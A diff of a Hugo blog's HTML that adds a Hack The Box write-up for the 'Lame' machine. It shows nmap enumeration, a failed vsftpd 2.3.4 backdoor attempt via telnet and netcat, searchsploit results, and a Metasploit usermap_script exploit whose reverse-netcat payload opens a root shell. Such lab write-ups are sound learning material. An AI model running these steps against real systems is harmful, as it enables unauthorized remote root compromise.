@@ -1,8 +1,8 @@
 
 <!DOCTYPE html>
-<html lang="en" data-figures="">
+<html lang="en" data-figures="true" class="page">
   <head>
-<title>Posts | Mdn1nj4</title>
+<title>Lame Writeup | Mdn1nj4</title>
 <meta charset="utf-8">
 <meta name="generator" content="Hugo 0.80.0" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -17,14 +17,14 @@
 <meta property="og:locale" content="en" />
 
 <meta property="og:type" content="article">
-<meta name="description" content="">
+<meta name="description" content="Lame is the Easy level Hackthebox Machine.">
 <meta name="twitter:card" content="summary" />
 <meta name="twitter:creator" content="@mdn1nj4">
-<meta name="twitter:title" content="Posts" />
-<meta property="og:url" content="https://mdninja.ml/post/" />
-<meta property="og:title" content="Posts" />
-<meta property="og:description" content="" />
-<meta property="og:image" content="https://mdninja.ml/images/thumbnail.png" />
+<meta name="twitter:title" content="Lame Writeup" />
+<meta property="og:url" content="https://mdninja.ml/post/lame_htb/" />
+<meta property="og:title" content="Lame Writeup" />
+<meta property="og:description" content="Lame is the Easy level Hackthebox Machine." />
+<meta property="og:image" content="https://mdninja.ml/images/lame.png" />
 <link rel="apple-touch-icon" sizes="180x180" href='https://mdninja.ml/icons/apple-touch-icon.png'>
 <link rel="icon" type="image/png" sizes="32x32" href='https://mdninja.ml/icons/favicon-32x32.png'>
 <link rel="manifest" href='https://mdninja.ml/icons/site.webmanifest'>
@@ -32,8 +32,7 @@
 <meta name="msapplication-TileColor" content="#002538">
 <meta name="theme-color" content="#002538">
 
-<link rel="canonical" href="https://mdninja.ml/post/">
-<link rel="alternate" type="application/rss+xml" href="https://mdninja.ml/post/index.xml" title="Mdn1nj4" />
+<link rel="canonical" href="https://mdninja.ml/post/lame_htb/">
 
     
 
@@ -50,8 +49,9 @@
   
   
     
+    
   
-  <body data-code="7" data-lines="false" id="documentTop">
+  <body data-code="10" data-lines="false" id="documentTop">
 
 <header class="nav_header" >
   <nav class="nav"><a href='https://mdninja.ml/' class="nav_brand nav_item" title="Mdn1nj4">Mdn1nj4
@@ -123,16 +123,10 @@
 </header>
 
     <main>
-
+  
 <div class="grid-inverse wrap content">
-  <ul class="posts" id="posts">
-      <li class="post_item">
-  <div class="excerpt">
-    <div class="excerpt_header">
-      <h3 class="post_link">
-        <a href="https://mdninja.ml/post/lame_htb/" title="Lame Writeup">Lame Writeup</a>
-      </h3>
-      <div class="post_meta">
+  <article class="post_content">
+    <h1 class="post_title">Lame Writeup</h1><div class="post_meta">
   
     <svg class="icon">
   <use xlink:href="#calendar"></use>
@@ -151,31 +145,109 @@
       </a>
 </div>
 
-    </div>
-    <div class="excerpt_footer partition">
-      <div class="excerpt_thumbnail">
-        <img src='https://mdninja.ml/images/lame.png' alt="Lame Writeup">
-      </div>
-      
-        <div>
-          <p class="pale">
-            
-              Introduction Lame is easy level beginner machine, Basic enumuration and exploiting the samba service which run the vuln version with RCE.
-Enumuration Always start with the common ports scanning for the open ports.I alwaysuse nmap to scan for the open ports.Nmap reveals the open ports.
-1#nmap -sV -oN lame.nmap …
-            
-          </p>
-          <a href="https://mdninja.ml/post/lame_htb/" title="Read More" class="excerpt_more button">Read More</a>
-        </div>
-      </div>
-    </div>
-  </li>
+    
+  <div class="post_share">
+    Share on:
+    <a href="https://twitter.com/intent/tweet?text=Lame%20Writeup&url=https%3a%2f%2fmdninja.ml%2fpost%2flame_htb%2f&tw_p=tweetbutton" class="twitter" title="Share on Twitter" target="_blank" rel="nofollow">
+      <svg class="icon">
+  <use xlink:href="#twitter"></use>
+</svg>
+    </a>
+    <a href="https://www.facebook.com/sharer.php?u=https%3a%2f%2fmdninja.ml%2fpost%2flame_htb%2f&t=Lame%20Writeup" class="facebook" title="Share on Facebook" target="_blank" rel="nofollow">
+      <svg class="icon">
+  <use xlink:href="#facebook"></use>
+</svg>
+    </a>
+    <a href="#linkedinshare" id = "linkedinshare" class="linkedin" title="Share on LinkedIn" rel="nofollow">
+      <svg class="icon">
+  <use xlink:href="#linkedin"></use>
+</svg>
+    </a>
+    <a href="https://mdninja.ml/post/lame_htb/" title="Copy Link" class="link link_yank">
+      <svg class="icon">
+  <use xlink:href="#copy"></use>
+</svg>
+    </a>
+  </div>
 
-    <li>
+    
+    <img src="/images/lame.png" class="image_featured" alt="Lame Writeup">
+    
+    <h2 id="__introduction__"><strong>Introduction</strong></h2>
+<p>Lame is easy level beginner machine, Basic enumuration and exploiting the samba service which run the vuln version with RCE.</p>
+<h2 id="__enumuration__"><strong>Enumuration</strong></h2>
+<p>Always start with the common ports scanning for the open ports.I alwaysuse nmap to scan for the open ports.Nmap reveals the open ports.</p>
+<div class="highlight"><pre class="chroma"><code class="language-zsh" data-lang="zsh"><span class="ln"> 1</span><span class="c1">#nmap -sV -oN lame.nmap 10.10.10.3 -Pn</span>
+<span class="ln"> 2</span>Host discovery disabled <span class="o">(</span>-Pn<span class="o">)</span>. All addresses will be marked <span class="s1">&#39;up&#39;</span> and scan <span class="nb">times</span> will be slower.
+<span class="ln"> 3</span>Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-03-17 03:46 GMT
+<span class="ln"> 4</span>Nmap scan report <span class="k">for</span> 10.10.10.3
+<span class="ln"> 5</span>Host is up <span class="o">(</span>0.13s latency<span class="o">)</span>.
+<span class="ln"> 6</span>Not shown: <span class="m">996</span> filtered ports
+<span class="ln"> 7</span>PORT    STATE SERVICE     VERSION
+<span class="ln"> 8</span>21/tcp  open  ftp         vsftpd 2.3.4
+<span class="ln"> 9</span>22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+<span class="ln">10</span>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+<span class="ln">11</span>445/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+<span class="ln">12</span>Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+<span class="ln">13</span>
+<span class="ln">14</span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span class="ln">15</span>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 32.51 seconds
+</code></pre></div><h2 id="__21---ftp__-_exploit-failed_"><strong>21 - FTP</strong> (<em>Exploit Failed</em>)</h2>
+<p>I do some googling for is there any exploit available for the ftp version and i got the RCE exploit for the vsftpd service but it seems to be not worked for me.</p>
+<div class="highlight"><pre class="chroma"><code class="language-zsh" data-lang="zsh"><span class="ln">1</span>telnet 10.10.10.3 <span class="m">21</span>
+<span class="ln">2</span>Trying 10.10.10.3...
+<span class="ln">3</span>Connected to 10.10.10.3.
+<span class="ln">4</span>Escape character is <span class="s1">&#39;^]&#39;</span>.
+<span class="ln">5</span><span class="m">220</span> <span class="o">(</span>vsFTPd 2.3.4<span class="o">)</span>
+<span class="ln">6</span>USER user:<span class="o">)</span>
+<span class="ln">7</span><span class="m">331</span> Please specify the password.
+<span class="ln">8</span>PASS pass
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-zsh" data-lang="zsh"><span class="ln">1</span><span class="c1">#nc 10.10.10.3 6200</span>
+<span class="ln">2</span>id
+<span class="ln">3</span>whoami
+<span class="ln">4</span>    <span class="c1">#does not work</span>
+</code></pre></div><h2 id="__exploitation__"><strong>Exploitation</strong></h2>
+<p>FTP is not a way to get this machine. So i moved to the samba service which is run in the lame machine. The version of the samba server seems to be exploitable ,Because it was outdated version so i hope there is some exploit available for the version.
+<img src="" alt=""></p>
+<h2 id="__samba-user-name-map-script__"><strong>Samba user name map script</strong></h2>
+<p>I found the exploit for the samba in searchsploit.There is exploit available in metasploit</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln"> 1</span>$searchsploit samba 3.0
+<span class="ln"> 2</span>----------------------------------------------------------------------------------------------------- ---------------------------------
+<span class="ln"> 3</span> Exploit Title                                                                                       |  Path
+<span class="ln"> 4</span>----------------------------------------------------------------------------------------------------- ---------------------------------
+<span class="ln"> 5</span>Samba 3.0.10 (OSX) - &#39;lsa_io_trans_names&#39; Heap Overflow (Metasploit)                                 | osx/remote/16875.rb
+<span class="ln"> 6</span>Samba 3.0.10 &lt; 3.3.5 - Format String / Security Bypass                                               | multiple/remote/10095.txt
+<span class="ln"> 7</span>Samba 3.0.20 &lt; 3.0.25rc3 - &#39;Username&#39; map script&#39; Command Execution (Metasploit)                     | unix/remote/16320.rb
+<span class="ln"> 8</span>Samba 3.0.21 &lt; 3.0.24 - LSA trans names Heap Overflow (Metasploit)                                   | linux/remote/9950.rb
+<span class="ln"> 9</span>Samba 3.0.24 (Linux) - &#39;lsa_io_trans_names&#39; Heap Overflow (Metasploit)                               | linux/remote/16859.rb
+<span class="ln">10</span>Samba 3.0.24 (Solaris) - &#39;lsa_io_trans_names&#39; Heap Overflow (Metasploit)                             | solaris/remote/16329.rb
+<span class="ln">11</span>Samba 3.0.27a - &#39;send_mailslot()&#39; Remote Buffer Overflow                                             | linux/dos/4732.c
+<span class="ln">12</span>Samba 3.0.29 (Client) - &#39;receive_smb_raw()&#39; Buffer Overflow (PoC)                                    | multiple/dos/5712.pl
+<span class="ln">13</span>Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                                     | linux/remote/364.pl
+<span class="ln">14</span>Samba &lt; 3.0.20 - Remote Heap Overflow                                                                | linux/remote/7701.txt
+<span class="ln">15</span>Samba &lt; 3.0.20 - Remote Heap Overflow                                                                | linux/remote/7701.txt
+<span class="ln">16</span>Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                                        | linux_x86/dos/36741.py
+<span class="ln">17</span>----------------------------------------------------------------------------------------------------- ---------------------------------
+<span class="ln">18</span>Shellcodes: No Results
+</code></pre></div><p>so i used it.  <a href="https://amriunix.com/post/cve-2007-2447-samba-usermap-script/">reference link</a></p>
+<div class="highlight"><pre class="chroma"><code class="language-zsh" data-lang="zsh"><span class="ln"> 1</span>msf6 &gt; use multi/samba/usermap_script
+<span class="ln"> 2</span><span class="o">[</span>*<span class="o">]</span> No payload configured, defaulting to cmd/unix/reverse_netcat
+<span class="ln"> 3</span>msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> &gt; <span class="nb">set</span> rhost 10.10.10.3
+<span class="ln"> 4</span><span class="nv">rhost</span> <span class="o">=</span>&gt; 10.10.10.3
+<span class="ln"> 5</span>msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> &gt; <span class="nb">set</span> lhost 10.10.14.4
+<span class="ln"> 6</span><span class="nv">lhost</span> <span class="o">=</span>&gt; 10.10.14.4
+<span class="ln"> 7</span>msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> &gt; exploit
+<span class="ln"> 8</span>
+<span class="ln"> 9</span><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.14.4:4444 
+<span class="ln">10</span><span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>10.10.14.4:4444 -&gt; 10.10.10.3:33415<span class="o">)</span> at 2021-03-17 04:00:50 +0000
+<span class="ln">11</span>
+<span class="ln">12</span>id
+<span class="ln">13</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+<span class="ln">14</span>
+</code></pre></div><p><strong><center>#Rooted this machine.</center></strong></p>
 
 
-    </li>
-  </ul>
+  </article>
 <aside class="sidebar">
   <section class="sidebar_inner">
     
@@ -184,17 +256,8 @@ Enumuration Always start with the common ports scanning for the open ports.I alw
         CTF Player | Student | CEH | Fast Learner
       </div>
       <a href='https://mdninja.ml/about/' class="button mt-1" role="button" title='Read More'>Read More</a>
-    <h2 class="mt-4">Featured Posts</h2>
-    <ul>
-      <li>
-        <a href="https://mdninja.ml/post/lame_htb/" class="nav-link" title="Lame Writeup">Lame Writeup</a>
-      </li>
-    </ul>
     <h2 class="mt-4">Recent Posts</h2>
     <ul class="flex-column">
-      <li>
-        <a href="https://mdninja.ml/post/lame_htb/" class="nav-link" title="Lame Writeup">Lame Writeup</a>
-      </li>
     </ul>
     <div>
       <h2 class="mt-4 taxonomy" id="categories-section">Categories</h2>
@@ -241,9 +304,8 @@ Enumuration Always start with the common ports scanning for the open ports.I alw
   </section>
 </aside>
 
+  
 </div>
-
-
     </main><svg width="0" height="0" class="hidden">
   <symbol viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" id="facebook">
     <path d="M437 0H75C33.648 0 0 33.648 0 75v362c0 41.352 33.648 75 75 75h151V331h-60v-90h60v-61c0-49.629 40.371-90 90-90h91v90h-91v61h91l-15 90h-76v181h121c41.352 0 75-33.648 75-75V75c0-41.352-33.648-75-75-75zm0 0"></path>
